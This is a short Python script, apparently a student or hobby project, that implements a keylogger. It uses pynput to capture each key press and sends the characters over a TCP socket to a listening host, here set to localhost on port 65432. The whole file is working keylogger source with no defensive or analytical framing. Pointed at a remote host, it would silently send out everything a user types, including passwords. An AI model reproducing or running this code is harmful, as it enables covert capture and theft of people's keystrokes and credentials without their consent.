# This is our main menu for the keylogger
import socket
from pynput import keyboard
# implementing HOST and PORT for networking
HOST ='127.0.0.1'
PORT =65432
def printMenu():
    s.send(bytes("---------------------",'utf-8'))
    s.send(bytes("WELCOMES TO KEYLOGGER",'utf-8'))
    s.send(bytes("---------------------\n",'utf-8'))

def logKeyStroke():
    #Now we stsrt events until released
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:

        listener.join()

def on_press(key):
    try:
        #This is where to send the data
        s.send(bytes(key.char, 'utf-8'))
        #print(key.char)
    except AttributeError:
        #print('{0}'.format(key.char))
        s.send(bytes('\n', 'utf-8'))
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False


#Our starting Point
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    printMenu()
    logKeyStroke()


